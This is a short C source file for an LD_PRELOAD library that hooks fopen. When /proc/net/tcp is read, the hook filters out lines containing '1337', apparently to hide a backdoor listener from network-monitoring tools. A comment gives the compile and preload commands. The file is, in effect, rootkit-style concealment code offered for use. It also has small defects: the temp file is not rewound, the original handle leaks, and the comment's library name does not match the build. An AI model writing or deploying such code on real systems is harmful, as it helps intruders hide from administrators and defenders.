#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <string.h>

FILE *(*orig_fopen)(const char *pathname, const char *mode);
FILE *fopen(const char *pathname, const char *mode)
{
	orig_fopen = dlsym(RTLD_NEXT, "fopen");
	char *ptr_tcp = strstr(pathname, "/proc/net/tcp");
	FILE *fp;

	if (ptr_tcp != NULL)
	{
		char line[256];
		FILE *temp = tmpfile();
		fp = orig_fopen(pathname, mode);
		while (fgets(line, sizeof(line), fp))
		{
			char *listener = strstr(line, "1337");
			if (listener != NULL)
			{
				continue;
			}
			else
			{
				fputs(line, temp);
			}
		}
		return temp;
	}
	fp = orig_fopen(pathname, mode);
	return fp;
}
//////////////////////////////////////////////////////////////
// gcc fopen.c -o fopen.so -fPIC -shared -ldl #-D_GNU_SOURCE//
//                 LD_PRELOAD=./strcmp.so ./file            //
//////////////////////////////////////////////////////////////